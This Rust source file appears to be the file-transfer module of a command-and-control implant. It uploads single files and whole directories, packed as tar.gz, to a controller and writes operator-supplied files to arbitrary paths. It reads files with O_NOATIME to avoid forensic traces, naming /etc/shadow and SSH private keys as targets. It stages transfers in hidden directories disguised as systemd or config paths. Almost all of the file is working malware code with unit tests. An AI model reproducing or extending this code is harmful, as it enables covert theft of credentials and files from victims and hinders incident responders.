use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use std::fs;
use std::io::Write; // for GzEncoder::write_all (see upload_dir_as_targz)
use std::path::{Path, PathBuf};

const CHUNK_SIZE: usize = 40000; // ~40KB per chunk (base64 encoded will be ~53KB)
/// Max chunks per upload (prevents disk exhaustion)
const MAX_UPLOAD_CHUNKS: usize = 2000; // 2000 × 40KB ≈ 80MB
/// Max base64 data length per chunk (prevents oversized chunk attacks)
const MAX_CHUNK_DATA_LEN: usize = 8 * 1024 * 1024; // 8MB base64 → ~6MB binary

#[derive(Serialize)]
struct FileUploadResponse {
    name: String,
    data: String,
}

#[derive(Serialize)]
struct FilePreviewResponse {
    path: String,
    /// UTF-8 text content — present only for textual files ≤200KB.
    #[serde(skip_serializing_if = "Option::is_none")]
    content: Option<String>,
    /// Raw bytes base64 (≤1MB) — lets the controller sniff magic bytes and
    /// render images/PDF even for extensionless files.
    #[serde(skip_serializing_if = "Option::is_none")]
    b64: Option<String>,
    size: u64,
    /// True when the file is not valid UTF-8 (controller renders hex/binary).
    binary: bool,
}

#[derive(Deserialize)]
pub struct UploadChunkRequest {
    pub transfer_id: String,
    pub path: String,
    pub chunk_index: usize,
    pub total_chunks: usize,
    pub data: String,
}

/// Maximum file size for a single upload (50 MB). Larger files return an error to prevent OOM.
const MAX_UPLOAD_FILE_BYTES: u64 = 50 * 1024 * 1024;

pub fn upload_file(path: &str) -> Result<String, String> {
    // ── 目录：整棵目录树打成 tar.gz（项 13），浏览器端以单文件落盘 ──
    if std::path::Path::new(path).is_dir() {
        return upload_dir_as_targz(path);
    }

    // ── 单文件：原有逻辑保持不变 ──
    // Check file size first to prevent OOM when reading very large files
    let meta = std::fs::metadata(path)
        .map_err(|e| format!("Error: {}", e))?;
    if meta.len() > MAX_UPLOAD_FILE_BYTES {
        crate::debug_log(&format!("upload_file: rejected too large: {} bytes path={}", meta.len(), path));
        return Err(format!(
            "Error: file too large ({} bytes > {} MB limit). Use readfile for preview or split the file.",
            meta.len(), MAX_UPLOAD_FILE_BYTES / 1024 / 1024
        ));
    }
    crate::debug_log(&format!("upload_file: path={} size={}", path, meta.len()));

    // Read with O_NOATIME to avoid updating atime (leaves fewer forensic traces)
    let data = read_file_noatime(path)?;
    let name = std::path::Path::new(path)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let encoded = encode_upload_data(&data);

    serde_json::to_string(&FileUploadResponse {
        name,
        data: encoded,
    })
    .map_err(|e| format!("Error: {}", e))
}

/// 把二进制载荷编码为 C2 下载协议：≤CHUNK_SIZE 直接 base64；
/// 更大则用 [FILE_START]/[CHUNK_n]/[FILE_END] 分块（控制器 _handle_file_save
/// 按行重组后落盘；此前该路径在控制器端直接 b64decode 整个串而失败）。
fn encode_upload_data(data: &Vec<u8>) -> String {
    if data.len() <= CHUNK_SIZE {
        return general_purpose::STANDARD.encode(data);
    }
    let total_chunks = (data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    crate::debug_log(&format!("upload_file: chunking into {} parts", total_chunks));
    let mut result = String::from("[FILE_START]\n");
    for (i, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
        result.push_str(&format!("[CHUNK_{}]\n", i));
        result.push_str(&general_purpose::STANDARD.encode(chunk));
        result.push('\n');
    }
    result.push_str("[FILE_END]");
    result
}

// ─── 目录上传：手写 ustar tar + gzip（项 13）──────────────────────────────────
//
// 目录树先在内存中打包为 ustar（512 字节块，mode 0644/0755，mtime，校验和），
// 再用 flate2 GzEncoder 压缩（与 stowaway 同款 API），最终以 `<目录名>.tar.gz`
// 名义走标准分块上传协议。目录内单个相对路径超过 100 字节时跳过并记日志——
// 完整 ustar 需要 prefix 扩展，为保持“无新依赖 + 手写 512 块”的简单性不实现。

fn upload_dir_as_targz(path: &str) -> Result<String, String> {
    let root = PathBuf::from(path);
    let dir_name = root.file_name().unwrap_or_default().to_string_lossy().to_string();
    if dir_name.is_empty() {
        return Err("Error: invalid directory name".to_string());
    }
    crate::debug_log(&format!("upload_dir: packing {} as {}.tar.gz", path, dir_name));

    let mut tar: Vec<u8> = Vec::new();
    tar_walk_add(&mut tar, &root, &dir_name)?;
    // ustar 结束标记：两个全零 512 块，符合 POSIX/tar 读取端约定
    tar.extend_from_slice(&vec![0u8; 1024]);
    crate::debug_log(&format!("upload_dir: tar bytes={}", tar.len()));

    // gzip 压缩；任一环节失败则降级为未压缩 tar（兼容极端环境，仍可解压）
    let gz = {
        use flate2::write::GzEncoder;
        use flate2::Compression;
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        if encoder.write_all(&tar).is_err() {
            tar
        } else {
            encoder.finish().unwrap_or(tar)
        }
    };

    if gz.len() as u64 > MAX_UPLOAD_FILE_BYTES {
        crate::debug_log(&format!("upload_dir: compressed too large: {} bytes", gz.len()));
        return Err(format!(
            "Error: directory too large after gzip ({} bytes > {} MB limit)",
            gz.len(), MAX_UPLOAD_FILE_BYTES / 1024 / 1024
        ));
    }
    crate::debug_log(&format!("upload_dir: gz bytes={}", gz.len()));

    let name = format!("{}.tar.gz", dir_name);
    serde_json::to_string(&FileUploadResponse {
        name,
        data: encode_upload_data(&gz),
    })
    .map_err(|e| format!("Error: {}", e))
}

/// 递归写入目录的 ustar 条目及其下所有内容。
fn tar_walk_add(out: &mut Vec<u8>, dir: &PathBuf, rel_name: &str) -> Result<(), String> {
    if rel_name.len() > 100 {
        crate::debug_log(&format!("upload_dir: skip long path (>100): {}", rel_name));
        return Ok(());
    }
    let meta = std::fs::metadata(dir).map_err(|e| format!("Error: {}", e))?;
    tar_write_entry(out, rel_name, true, 0, None, dir_mtime(&meta));

    let entries = std::fs::read_dir(dir).map_err(|e| format!("Error: {}", e))?;
    for entry in entries.filter_map(|e| e.ok()) {
        let path = entry.path();
        let fname = path.file_name().unwrap_or_default().to_string_lossy().to_string();
        let child_rel = if rel_name.is_empty() {
            fname
        } else {
            format!("{}/{}", rel_name, fname)
        };
        if child_rel.len() > 100 {
            crate::debug_log(&format!("upload_dir: skip long path (>100): {}", child_rel));
            continue;
        }
        // 审计修复（bug#14）：符号链接一律跳过。is_dir()/read 会跟随 symlink，
        // /tmp、/var/tmp 等可写目录里常见的 a→b→a 环会导致无限递归（栈溢出
        // 或巨型 tar）；read_link 仅对符号链接成功，是可靠的判定。
        if std::fs::read_link(&path).is_ok() {
            crate::debug_log(&format!("upload_dir: skip symlink {}", child_rel));
            continue;
        }
        if path.is_dir() {
            tar_walk_add(out, &path, &child_rel)?;
        } else {
            let meta = std::fs::metadata(&path).map_err(|e| format!("Error: {}", e))?;
            let size = meta.len();
            let data = std::fs::read(&path).map_err(|e| format!("Error: {}", e))?;
            tar_write_entry(out, &child_rel, false, size, Some(&data), dir_mtime(&meta));
        }
    }
    Ok(())
}

/// 写一个 512 字节 ustar 头（+ 可选数据块，按 512 对齐）。
#[allow(dead_code)]
fn tar_write_entry(
    out: &mut Vec<u8>,
    name: &str,
    is_dir: bool,
    size: u64,
    data: Option<&[u8]>,
    mtime: u64,
) {
    let mut header = vec![0u8; 512];

    // name（固定 100 字节字段；超长由调用方跳过）
    header[0..name.len()].copy_from_slice(name.as_bytes());

    // 模式 / 属主：文件 0644、目录 0755；uid/gid 置 0
    let mode: &[u8] = if is_dir { b"0000755\0" } else { b"0000644\0" };
    header[100..108].copy_from_slice(mode);
    header[108..116].copy_from_slice(b"0000000\0");
    header[116..124].copy_from_slice(b"0000000\0");

    // size / mtime：11 个八进制字符 + NUL（12 字节字段）
    let size_oct = format!("{:011o}\0", size);
    header[124..136].copy_from_slice(size_oct.as_bytes());
    let mtime_oct = format!("{:011o}\0", mtime);
    header[136..148].copy_from_slice(mtime_oct.as_bytes());

    // 类型：'5' 目录 / '0' 普通文件；+ ustar 魔数与属主名（各 32 字节定长字段）
    header[156] = if is_dir { b'5' } else { b'0' };
    header[257..263].copy_from_slice(b"ustar\0");
    header[263..265].copy_from_slice(b"00");
    let mut uname_gname = vec![0u8; 64];
    uname_gname[0..5].copy_from_slice(b"root\0");
    uname_gname[32..37].copy_from_slice(b"root\0");
    header[265..329].copy_from_slice(&uname_gname);

    // 校验和必须最后算（此时头部全部字段已写入）：先把 chksum 视为 8 个空格
    // 求和，回填为 6 位八进制 + NUL + 空格。掩码 0o777777 与 POSIX/GNU tar 一致。
    let mut sum: u32 = 0;
    for i in 0..148 { sum += header[i] as u32; }
    sum += 8 * (b' ' as u32);
    for i in 156..512 { sum += header[i] as u32; }
    let chk = format!("{:06o}\0 ", sum & 0o777777);
    header[148..156].copy_from_slice(chk.as_bytes());

    out.extend_from_slice(&header);

    if let Some(d) = data {
        out.extend_from_slice(d);
        let pad = (512 - (d.len() % 512)) % 512;
        if pad > 0 {
            out.extend_from_slice(&vec![0u8; pad]);
        }
    }
}

/// 文件 mtime（Unix 秒）；读不到时退回到校准后的当前时钟。
fn dir_mtime(meta: &std::fs::Metadata) -> u64 {
    meta.modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
        .unwrap_or_else(|| crate::net::now_unix_secs() as u64)
}

/// Maximum total assembled size for a single download (50 MB)
const MAX_DOWNLOAD_ASSEMBLE_BYTES: usize = 50 * 1024 * 1024;

pub fn download_file(path: &str, base64_data: &str) -> Result<String, String> {
    crate::debug_log(&format!("download_file: path={} data_len={}", path, base64_data.len()));
    validate_download_path(path)?;
    let data = if base64_data.contains("[FILE_START]") {
        // Reassemble chunked file with size guard
        let mut full_data: Vec<u8> = Vec::new();
        for line in base64_data.lines() {
            if line.starts_with("[CHUNK_") || line == "[FILE_START]" || line == "[FILE_END]" {
                continue;
            }
            if let Ok(chunk) = general_purpose::STANDARD.decode(line) {
                if full_data.len() + chunk.len() > MAX_DOWNLOAD_ASSEMBLE_BYTES {
                    return Err(format!(
                        "Error: assembled file exceeds {} MB limit",
                        MAX_DOWNLOAD_ASSEMBLE_BYTES / 1024 / 1024
                    ));
                }
                full_data.extend_from_slice(&chunk);
            }
        }
        full_data
    } else {
        let decoded = general_purpose::STANDARD
            .decode(base64_data)
            .map_err(|e| format!("Error: {}", e))?;
        if decoded.len() > MAX_DOWNLOAD_ASSEMBLE_BYTES {
            return Err(format!(
                "Error: file data exceeds {} MB limit",
                MAX_DOWNLOAD_ASSEMBLE_BYTES / 1024 / 1024
            ));
        }
        decoded
    };

    std::fs::write(path, data).map_err(|e| format!("Error: {}", e))?;
    crate::debug_log(&format!("download_file: written to {}", path));
    Ok("File saved".to_string())
}

/// transfer_id must be alphanumeric + hyphens/underscores only — prevents path traversal.
fn validate_transfer_id(id: &str) -> Result<(), String> {
    if id.is_empty() || id.len() > 64 {
        return Err("Error: Invalid transfer_id length".to_string());
    }
    if !id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
        return Err("Error: transfer_id contains invalid characters".to_string());
    }
    Ok(())
}

/// Reject paths that contain ".." components.
/// Note: writing to arbitrary paths is intentional in a C2 context; this check only
/// blocks path traversal sequences — absolute paths are still allowed.
fn validate_download_path(path: &str) -> Result<(), String> {
    let p = std::path::Path::new(path);
    for component in p.components() {
        if component == std::path::Component::ParentDir {
            return Err("Error: path traversal detected in download path".to_string());
        }
    }
    Ok(())
}

pub fn handle_upload_chunk(request: UploadChunkRequest) -> Result<String, String> {
    if request.total_chunks == 0 {
        return Err("Error: Invalid total_chunks".to_string());
    }
    if request.total_chunks > MAX_UPLOAD_CHUNKS {
        return Err(format!("Error: total_chunks {} exceeds limit {}", request.total_chunks, MAX_UPLOAD_CHUNKS));
    }
    if request.data.len() > MAX_CHUNK_DATA_LEN {
        return Err(format!("Error: chunk data size {} exceeds limit {}", request.data.len(), MAX_CHUNK_DATA_LEN));
    }
    if request.chunk_index >= request.total_chunks {
        return Err(format!("Error: chunk_index {} >= total_chunks {}", request.chunk_index, request.total_chunks));
    }

    validate_transfer_id(&request.transfer_id)?;
    validate_download_path(&request.path)?;

    let state_dir = get_upload_state_dir(&request.transfer_id)?;
    fs::create_dir_all(&state_dir).map_err(|e| format!("Error: {}", e))?;

    let meta_path = state_dir.join("meta.json");
    let meta = serde_json::json!({
        "path": request.path,
        "total_chunks": request.total_chunks,
    });
    fs::write(
        &meta_path,
        serde_json::to_vec(&meta).map_err(|e| e.to_string())?,
    )
    .map_err(|e| format!("Error: {}", e))?;

    let part_path = state_dir.join(format!("part_{:08}", request.chunk_index));
    let decoded = general_purpose::STANDARD
        .decode(request.data)
        .map_err(|e| format!("Error: {}", e))?;
    fs::write(part_path, decoded).map_err(|e| format!("Error: {}", e))?;

    let received = count_received_parts(&state_dir)?;
    if received < request.total_chunks {
        crate::debug_log(&format!("upload_chunk: progress {}/{} id={}", received, request.total_chunks, request.transfer_id));
        return Ok(format!(
            "[UPLOAD_PROGRESS] {}/{} {}",
            received, request.total_chunks, request.transfer_id
        ));
    }

    // Verify all indices 0..total_chunks-1 exist before assembling.
    // count_received_parts only counts part_* files; duplicate indices
    // would overwrite the same file and inflate the count incorrectly.
    for idx in 0..request.total_chunks {
        let part = state_dir.join(format!("part_{:08}", idx));
        if !part.exists() {
            crate::debug_log(&format!("upload_chunk: missing chunk {} of {}", idx, request.total_chunks));
            return Err(format!(
                "Error: missing chunk index {} (have {}/{})",
                idx, received, request.total_chunks
            ));
        }
    }

    crate::debug_log(&format!("upload_chunk: assembling {} chunks to {}", request.total_chunks, request.path));
    assemble_uploaded_file(&state_dir, &request.path, request.total_chunks)?;
    fs::remove_dir_all(&state_dir).ok();
    crate::debug_log(&format!("upload_chunk: complete path={}", request.path));
    Ok(format!("[UPLOAD_COMPLETE] {} {}", request.path, request.transfer_id))
}

pub fn preview_file(path: &str) -> Result<String, String> {
    // Text content cap and raw-bytes cap. Text stays small for terminal-friendliness;
    // raw b64 up to 1MB covers images/PDF previews through the C2 channel.
    const MAX_TEXT_SIZE: u64 = 200 * 1024;
    const MAX_RAW_SIZE: u64 = 1024 * 1024;

    let metadata = fs::metadata(path).map_err(|e| format!("Error: {}", e))?;
    let size = metadata.len();
    if size > MAX_RAW_SIZE {
        crate::debug_log(&format!("preview_file: too large {} bytes path={}", size, path));
        return Ok(format!(
            "[FILE_PREVIEW_NOTICE] File too large to preview (>1MB). Please download it."
        ));
    }
    crate::debug_log(&format!("preview_file: path={} size={}", size, path));

    // O_NOATIME read: does not update atime, reduces forensic traces
    let data = read_file_noatime(path)?;

    // Valid UTF-8 → textual: include content directly (bounded).
    // Otherwise binary: b64 only; the controller sniffs magic bytes.
    let (content, binary) = match String::from_utf8(data.clone()) {
        Ok(text) if size <= MAX_TEXT_SIZE => (Some(text), false),
        Ok(_) => (None, false), // text but oversized: still send b64, controller falls back
        Err(_) => (None, true),
    };
    let b64 = if content.is_none() {
        Some(general_purpose::STANDARD.encode(&data))
    } else {
        None
    };

    serde_json::to_string(&FilePreviewResponse {
        path: path.to_string(),
        content,
        b64,
        size,
        binary,
    })
    .map(|payload| format!("[FILE_PREVIEW_JSON]\n{}", payload))
    .map_err(|e| format!("Error: {}", e))
}

fn get_upload_state_dir(transfer_id: &str) -> Result<PathBuf, String> {
    let base = get_upload_base_dir()?;
    Ok(base.join(transfer_id))
}

/// Drop incomplete upload directories older than `max_age_secs`.
/// Interrupted transfers otherwise leave part_* + meta.json forever.
pub fn cleanup_stale_uploads(max_age_secs: u64) -> usize {
    let Ok(base) = get_upload_base_dir() else { return 0 };
    cleanup_stale_in(&base, std::time::Duration::from_secs(max_age_secs))
}

fn cleanup_stale_in(base: &Path, max_age: std::time::Duration) -> usize {
    let Ok(rd) = fs::read_dir(base) else { return 0 };
    let now = std::time::SystemTime::now();
    let mut n = 0;
    for ent in rd.flatten() {
        let path = ent.path();
        if !path.is_dir() {
            continue;
        }
        let name_os = ent.file_name();
        let name = name_os.to_string_lossy();
        if name.is_empty() || name.len() > 64
            || !name.chars().all(|c| c.is_ascii_hexdigit() || c == '-' || c == '_')
        {
            continue;
        }
        let Ok(meta) = ent.metadata() else { continue };
        let Ok(mtime) = meta.modified() else { continue };
        if now.duration_since(mtime).unwrap_or_default() <= max_age {
            continue;
        }
        if fs::remove_dir_all(&path).is_ok() {
            n += 1;
            crate::debug_log(&format!("cleanup_stale_uploads: removed {}", path.display()));
        }
    }
    n
}

fn get_upload_base_dir() -> Result<PathBuf, String> {
    #[cfg(windows)]
    {
        let username = whoami::username();
        Ok(PathBuf::from(format!(
            r"C:\Users\{}\AppData\Local\.config\uploads",
            username
        )))
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            Ok(PathBuf::from("/var/tmp/.systemd/coredump"))
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            Ok(PathBuf::from(format!("{}/.local/share/coredump", home)))
        }
    }
}

fn count_received_parts(state_dir: &Path) -> Result<usize, String> {
    let mut count = 0;
    for entry in fs::read_dir(state_dir).map_err(|e| format!("Error: {}", e))? {
        let entry = entry.map_err(|e| format!("Error: {}", e))?;
        if entry.file_name().to_string_lossy().starts_with("part_") {
            count += 1;
        }
    }
    Ok(count)
}

fn assemble_uploaded_file(
    state_dir: &Path,
    target_path: &str,
    total_chunks: usize,
) -> Result<(), String> {
    let target = PathBuf::from(target_path);
    if let Some(parent) = target.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("Error: {}", e))?;
    }

    let temp_target = target.with_extension("uploading_tmp");
    let mut output = fs::File::create(&temp_target).map_err(|e| format!("Error: {}", e))?;
    for idx in 0..total_chunks {
        let part_path = state_dir.join(format!("part_{:08}", idx));
        let data = fs::read(&part_path).map_err(|e| format!("Error: {}", e))?;
        std::io::Write::write_all(&mut output, &data).map_err(|e| format!("Error: {}", e))?;
    }
    drop(output);

    if target.exists() {
        fs::remove_file(&target).map_err(|e| format!("Error: {}", e))?;
    }
    fs::rename(&temp_target, &target).map_err(|e| format!("Error: {}", e))?;
    Ok(())
}

// ─── O_NOATIME file read ──────────────────────────────────────────────────────

/// Read a file with O_NOATIME to avoid updating the last-access time (atime).
///
/// Forensic benefit:
///   - atime of the target file stays unchanged; disk forensics cannot use it
///     to detect access. Particularly important for /etc/shadow, SSH private keys, etc.
///
/// Implementation:
///   - Linux: uses O_NOATIME (0x40000), valid only for file owner or root
///   - EPERM (not owner): silently falls back to a normal read
///   - non-Linux: direct normal read
fn read_file_noatime(path: &str) -> Result<Vec<u8>, String> {
    #[cfg(target_os = "linux")]
    {
        use std::os::unix::fs::OpenOptionsExt;
        const O_NOATIME: i32 = 0x40000;
        let result = fs::OpenOptions::new()
            .read(true)
            .custom_flags(O_NOATIME)
            .open(path);
        match result {
            Ok(mut f) => {
                use std::io::Read;
                let mut data = Vec::new();
                f.read_to_end(&mut data).map_err(|e| format!("Error: {}", e))?;
                return Ok(data);
            }
            Err(e) if e.raw_os_error() == Some(libc::EPERM) => {
                // Not the file owner — fall back to a normal read
            }
            Err(e) => return Err(format!("Error: {}", e)),
        }
    }
    // Fallback: normal read
    fs::read(path).map_err(|e| format!("Error: {}", e))
}

// ─── 单元测试：目录打包 → tar.gz → 逆向校验 ───────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[derive(Deserialize)]
    struct TestUploadResp {
        name: String,
        data: String,
    }

    fn parse_octal(b: &[u8]) -> u32 {
        let mut v: u32 = 0;
        for i in 0..b.len() {
            if b[i] == 0 || b[i] == b' ' {
                break;
            }
            v = v * 8 + (b[i] - b'0') as u32;
        }
        v
    }

    fn block_all_zero(block: &[u8]) -> bool {
        for i in 0..block.len() {
            if block[i] != 0 {
                return false;
            }
        }
        true
    }

    /// POSIX 校验和：chksum 字段视为 8 空格参与求和，再与头部存储值比对。
    fn tar_checksum_ok(block: &[u8]) -> bool {
        let mut sum: u32 = 0;
        for i in 0..148 {
            sum += block[i] as u32;
        }
        sum += 8 * (b' ' as u32);
        for i in 156..512 {
            sum += block[i] as u32;
        }
        sum & 0o777777 == parse_octal(&block[148..156])
    }

    #[test]
    fn dir_pack_produces_valid_ustar_gz() {
        let base = format!("target/tartest_{}", std::process::id());
        let root = PathBuf::from(&base);
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(&root).expect("create root dir");
        fs::create_dir_all(root.join("sub")).expect("create sub dir");
        fs::write(root.join("a.txt"), "hello world".as_bytes().to_vec()).expect("write a.txt");
        fs::write(root.join("sub/b.bin"), vec![0u8; 700]).expect("write b.bin");

        let payload = upload_dir_as_targz(&base).expect("pack directory into tar.gz");

        let parsed: TestUploadResp = serde_json::from_str(&payload).expect("parse upload response");
        assert!(parsed.name.ends_with(".tar.gz"), "archive name should end with .tar.gz, got {}", parsed.name);
        // 目录归档默认 < 40KB，走单块 base64 —— 不带 [FILE_START] 分块标记
        assert!(!parsed.data.contains("[FILE_START]"), "small dir archive should not be chunked");

        let data = general_purpose::STANDARD.decode(&parsed.data).expect("base64 decode");
        let mut tar = Vec::new();
        {
            use flate2::read::GzDecoder;
            use std::io::Read;
            let gz_slice: &[u8] = &data[..];
            let mut decoder = GzDecoder::new(gz_slice);
            decoder.read_to_end(&mut tar).expect("gunzip failed");
        }

        assert!(tar.len() % 512 == 0, "tar len {} is not a multiple of 512", tar.len());
        // 结束标记：最后两个全零块
        assert!(block_all_zero(&tar[tar.len() - 1024..]), "missing 1024-byte end marker");

        // 遍历 ustar 块，逐头校验校验和并验证关键条目
        let mut found_a = false;
        let mut found_sub_dir = false;
        let mut found_b = false;
        let mut off = 0;
        while off + 512 <= tar.len() {
            let block = &tar[off..off + 512];
            if block_all_zero(block) {
                off += 512;
                continue;
            }
            assert!(tar_checksum_ok(block), "checksum mismatch at tar offset {}", off);
            let name = String::from_utf8_lossy(&block[0..100])
                .trim_end_matches('\0')
                .to_string();
            let size = parse_octal(&block[124..136]) as usize;
            let typeflag = block[156];
            if name == "a.txt" || name.ends_with("/a.txt") {
                found_a = true;
                let content = &tar[off + 512..off + 512 + size];
                assert!(content.to_vec() == "hello world".as_bytes().to_vec(),
                        "a.txt content corrupted");
            }
            if name == "sub" || name.ends_with("/sub") {
                found_sub_dir = true;
                assert!(typeflag == b'5', "sub should be a directory entry, type={}", typeflag);
            }
            if name.ends_with("/sub/b.bin") {
                found_b = true;
                assert!(size == 700 && block_all_zero(&tar[off + 512..off + 512 + size]),
                        "b.bin content corrupted (size={})", size);
            }
            off += 512 + ((size + 511) / 512) * 512;
        }
        assert!(found_a, "a.txt entry not found");
        assert!(found_sub_dir, "sub directory entry not found");
        assert!(found_b, "sub/b.bin entry not found");

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn stale_upload_dir_is_removed() {
        let base = PathBuf::from(format!("target/upload_ttl_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let old = base.join("aabbccddeeff0011");
        fs::create_dir_all(&old).unwrap();
        fs::write(old.join("meta.json"), b"{}").unwrap();
        std::thread::sleep(std::time::Duration::from_millis(20));
        // max_age=0 → any directory with mtime in the past is stale
        assert_eq!(cleanup_stale_in(&base, std::time::Duration::from_secs(0)), 1);
        assert!(!old.exists());
        let _ = fs::remove_dir_all(&base);
    }
}
